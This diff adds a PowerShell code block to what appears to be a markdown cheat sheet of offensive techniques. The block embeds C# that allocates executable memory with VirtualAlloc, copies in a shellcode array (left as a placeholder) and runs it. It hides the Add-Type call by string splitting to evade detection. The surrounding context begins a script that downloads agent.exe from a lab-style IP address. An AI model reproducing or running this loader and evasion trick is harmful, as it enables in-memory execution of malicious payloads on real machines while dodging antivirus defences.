@@ -53,6 +53,34 @@ Add-Type $MyBusinessLogic
 ```
 
 ```powershell
+$X = [string]::Join('', ( @'
+using System;
+using System.Runtime.InteropServices;
+
+public class Zz {
+    static byte[] z = new byte[<bytes>] { <shellcode> };
+
+    [DllImport("kernel32.dll", EntryPoint="VirtualAlloc")]
+    static extern IntPtr V(IntPtr a, uint s, uint t, uint m);
+
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    delegate void W();
+
+    public static void M() {
+        IntPtr p = V(IntPtr.Zero, Convert.ToUInt32(z.Length), 0x1000, 0x40);
+        Marshal.Copy(z, 0, p, z.Length);
+        W r = Marshal.GetDelegateForFunctionPointer<W>(p);
+        r();
+    }
+}
+'@ ).ToCharArray())
+
+&('Add'+'-'+'Type') $X
+[Zz]::M()
+
+```
+
+```powershell
 # Define variables
 $url = "http://10.10.14.2:8080/agent.exe"
 $exeName = "agent.exe"
